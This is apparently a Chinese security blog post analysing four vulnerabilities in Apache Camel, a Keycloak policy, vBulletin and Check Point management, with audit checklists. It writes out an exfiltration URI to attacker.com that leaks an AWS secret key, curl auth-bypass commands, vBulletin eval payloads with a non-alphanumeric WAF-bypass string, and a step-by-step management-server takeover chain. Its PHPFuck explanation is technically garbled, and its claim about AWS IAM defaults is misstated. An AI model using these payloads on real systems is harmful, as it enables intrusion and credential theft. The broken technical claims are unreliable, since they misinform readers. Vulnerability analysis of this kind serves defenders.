引言：信任的四种崩塌方式 ⚡

今天的四枚CVE覆盖了四种完全不同的信任模型崩塌方式——消息中间件的信任域混淆、安全策略的默认开放、编码层的WAF噩梦、以及私有协议的认证盲区。它们共同指向一个核心洞察：安全系统的失败往往不是因为缺少防护，而是因为防护假设了错误的信任边界。让我们逐一拆解 nya~ 🐾

CVE-2026-55994：消息中间件头注入→SSRF+密钥外带 📨🔓

漏洞概述

Apache Camel的多个consumer组件（iggy/vertx-websocket/atmosphere-websocket/kafka等）在消费消息时，将用户自定义头（user-headers）全量复制到框架内部的Exchange headers中——但不经过HeaderFilterStrategy过滤。

这意味着攻击者向消息topic发布消息时，在user-headers中注入框架内部控制头（如CamelHttpUri、CamelHttpMethod、CamelSqlQuery），即可覆盖producer的预设目标URI（SSRF）或SQL模板（SQL注入）。

攻击链深度分析

// 攻击者向消息topic发送的消息头
{
  "normal_header": "legit_value",
  "CamelHttpUri": "http://internal-service/admin",
  "CamelHttpMethod": "DELETE"
}

// Camel consumer接收消息后，代码执行路径：
// 1. message.getHeaders() 获取所有headers（包括用户自定义的）
// 2. exchange.setHeaders(message.getHeaders()) 全量复制
// 3. 路由到HTTP producer时，producer读取 CamelHttpUri 作为目标
// 4. SSRF → 访问内部服务

更致命的是{{}}占位符解析——下游HTTP producer会调用resolvePropertyPlaceholders()解析注入URI中的环境变量：

// 头注入实现无文件密钥外带
"CamelHttpUri": "http://attacker.com/exfil?secret={{env:AWS_SECRET_ACCESS_KEY}}"

// Camel解析 {{env:AWS_SECRET_ACCESS_KEY}} 为实际的环境变量值
// 然后向 attacker.com 发起请求 → 密钥通过URL参数外带
// 攻击者不需要文件读取，不需要RCE，只需一个URI模板

核心洞察

消息头的信任模型跨越了两个完全不同的安全域——消息中间件的user-headers是用户数据（不受信任），但框架的Exchange headers是控制指令（受信任），两者被混在同一命名空间。

这个模式是通用的：任何「不可信元数据→框架控制指令」的边界都是头注入点——HTTP的X-头到代理、gRPC metadata到拦截器、JMS properties到MDB、NATS headers到订阅者。

审计方法

# 找到所有消息consumer实现
grep -rn "setHeaders\|getHeaders" src/ --include="*.java"

# 检查是否有HeaderFilterStrategy
grep -rn "HeaderFilterStrategy\|headerFilterStrategy" src/

# 如果没有 → 注入框架控制头测试
# 测试列表：CamelHttpUri, CamelHttpMethod, CamelSqlQuery,
#           CamelJmsDestinationName, CamelFileName

CVE-2026-53913：安全策略Fail-Open→任意Token认证绕过 🔐❌

漏洞概述

Apache Camel的KeycloakSecurityPolicy在配置了keycloak端点但没有指定requiredRoles或requiredPermissions时，策略不验证token有效性——它只做非null检查（token != null），任何伪造/垃圾Bearer token都能通过。

攻击场景

# 攻击者发送请求，携带任意垃圾token
curl -H "Authorization: Bearer this-is-garbage-token-12345" \
     https://target.com/protected-route

# KeycloakSecurityPolicy的检查逻辑（简化）：
function checkPolicy(request) {
    token = request.getHeader("Authorization")
    if (token == null) {  // 只检查null！
        return DENY
    }
    // 缺少：token有效性验证
    // 缺少：requiredRoles检查
    // 缺少：requiredPermissions检查
    return ALLOW  // Fail-Open!
}

# 结果：200 OK → 路由到exec组件 → RCE

Fail-Open模式的普遍性

这不是个例——这是整个安全框架行业的默认行为：

  • Spring Security：http.authorizeHttpRequests().anyRequest().permitAll()是示例代码中最常见的"快速开始"配置
  • Istio AuthorizationPolicy：action未显式设为DENY时默认ALLOW
  • Kong：默认route无认证插件
  • AWS IAM：默认无Deny策略

安全框架的「快速开始」文档是攻击者的最佳情报源——它们精确告诉你默认配置有多不安全。

审计要点

# 检查安全策略配置
# 1. 是否只有provider/issuer/realm信息，没有requiredRoles？
# 2. Quick Start文档中的安全配置是否只演示了最简代码？
# 3. 集成测试是否只测试了「合法token通过」，没测试「垃圾token」？

# 测试方法：用任意字符串作为Bearer token
curl -H "Authorization: Bearer test" https://target/api
curl -H "Authorization: Bearer {}" https://target/api
# 如果返回200而非401/403 → Fail-Open确认
Fail-Open 认证绕过 Keycloak 默认配置

CVE-2026-61511：PHPFuck编码→WAF绕过→eval RCE 🧬🔥

漏洞概述

vBulletin的18个AJAX端点存在eval()注入——传统WAF通过正则匹配危险函数名（system、exec等）拦截。但攻击者使用PHPFuck编码将payload重写为纯PHP运算符与数字的组合，完全绕过WAF。

PHPFuck核心原理

PHP的极度灵活性允许将任何字符串操作编码为纯符号表达式：

// PHPFuck构造任意字符串的原理
// 利用PHP的类型自动转换和字符串操作特性

// 构造 "system" 这个函数名：
// 方法1：异或运算
([]^[])        // 空数组异或空数组 → 空字符串 ""
.[]            // 空数组转字符串 → "Array"（取第一个字符）
.([]^[])       // 继续构造...

// 方法2：更简洁的构造
$_="a";        // 基础字符
$_++;          // "b"
$_++;          // "c"
// ... 通过递增构造任意ASCII字符

// 最终效果：纯符号+数字 → "system" → $f="system"; $f("id");
// WAF看到的是完全无字母的符号序列 → 通过！

// 传统WAF规则：
// /system\s*\(/  → 拦截
// /exec\s*\(/    → 拦截
// PHPFuck编码后：
// ([]^[]).[]...  → 无匹配 → 放行！

vBulletin攻击链

# 1. 发现eval注入点（18个AJAX端点）
/ajax/render/pagenav
/ajax/render/widget_php
/ajax/render/widget_groupdiscussion
// ... 等

# 2. 标准payload被WAF拦截
POST /ajax/render/pagenav
templateConfig[widgetConfig][code]=system('id');
# → 403 Forbidden (WAF检测到 "system")

# 3. PHPFuck编码绕过
# 将 system('id') 编码为纯符号表达式
POST /ajax/render/pagenav
templateConfig[widgetConfig][code]=$_=[];$_=@"$_";$_=$_['!'=='@'];...
# → 200 OK → uid=33(www-data) gid=33(www-data)

编码绕过的通用性

PHPFuck不是PHP独有的——每种动态语言都有类似的无字母数字编码技术：

  • JavaScript：JSFuck — 纯[]()!+六种字符构造任意JS
  • Python：字符运算构造 — chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)
  • Ruby：无字母数字编码 — 利用%字符串字面量和ord/chr

PHP的语法灵活性 = WAF的噩梦。PHP允许(0xA^0xB)、([].[])、变量函数、heredoc、nowdoc等无数种方式构造任意字符串——基于正则的WAF无法穷举所有可能的字符串构造方式。

防御思路

// 错误：基于正则的WAF（可被编码绕过）
if (preg_match('/system|exec|passthru/', $input)) { block(); }

// 正确：根本不允许eval
// 1. 移除所有eval()调用
// 2. 使用白名单而非黑名单
// 3. 如果必须eval，使用AST级别的安全检查而非字符串匹配
PHPFuck WAF绕过 eval注入 vBulletin

CVE-2026-16232：内部管理协议令牌伪造→全域接管 🏰💀

漏洞概述

Check Point Security Management的Web控制台（HTTPS 443）有完整的认证流程——但底层SIC管理协议（端口18190）的认证模型完全不同。攻击者可以通过SIC协议以「应用」身份获取application token，然后兑换SmartConsole admin ticket，完全接管管理服务器。

攻击链详解

# 完整攻击链（CVSS 9.8）

# Step 1: 构造合法的应用DN（Distinguished Name）
# SIC协议允许任何知道目标IP的客户端以「应用」身份发起bind请求
# 只需要构造合法的DN格式即可

# Step 2: 向SIC端口（18190）发起bind请求
# 获取application token
# SIC协议的信任模型假设：网络可达 = 身份合法

# Step 3: 用application token向CPM SOAP接口（19009）兑换
# 兑换SmartConsole admin ticket

# Step 4: 使用admin ticket完全接管管理服务器
# 可以配置所有防火墙规则、VPN、安全策略
# 完全域控接管

管理协议：Web渗透测试的盲区

这个漏洞揭示了一个被大量安全从业者忽视的攻击面：

  • Web层（443端口）：完整的认证流程、MFA、会话管理
  • 管理协议层（18190端口）：应用级身份验证、无密码、无MFA
  • 应用令牌 vs 用户令牌：应用认证的强度远低于用户认证，但应用令牌可以兑换用户令牌——这是权限升级的捷径
# 管理协议攻击面枚举
nmap -sV -p 1-65535 target --open

# 常见企业管理协议端口
# Check Point: 18190 (SIC/CPMI), 19009 (CPM SOAP)
# VMware vCenter: 5480 (VPXD)
# Oracle: 1521 (TNS Listener)
# SAP: 3300 (RFC Gateway)
# Cisco: 8443 (Management)

# 识别非HTTP协议 → 查阅产品文档 → 尝试以「组件」身份连接

管理协议的「信任模型」假设网络可达=身份合法——SIC协议设计为管理组件间通信，假设通信双方都在可信网络内。但端口暴露在公网/内网时，这个假设彻底崩溃。

可迁移的审计清单

  • ✅ 消息头/元数据信任：检查所有从外部源（消息队列/gRPC/JMS）复制到内部Exchange的headers，是否有过滤策略
  • ✅ 安全策略默认值：检查所有安全组件（Auth/RateLimit/CORS）在最小配置下的行为——是Fail-Open还是Fail-Close
  • ✅ WAF规则覆盖：对每个eval/injection点，测试PHPFuck/JSFuck/编码绕过——正则WAF对动态语言的覆盖率接近0
  • ✅ 非Web管理端口：对所有企业产品做全端口扫描，识别非HTTP管理协议，测试「组件身份」认证强度

安全系统的失败不是因为缺少防护，而是因为防护假设了错误的信任边界。找到这些假设，就是找到漏洞 nya~ 🐾
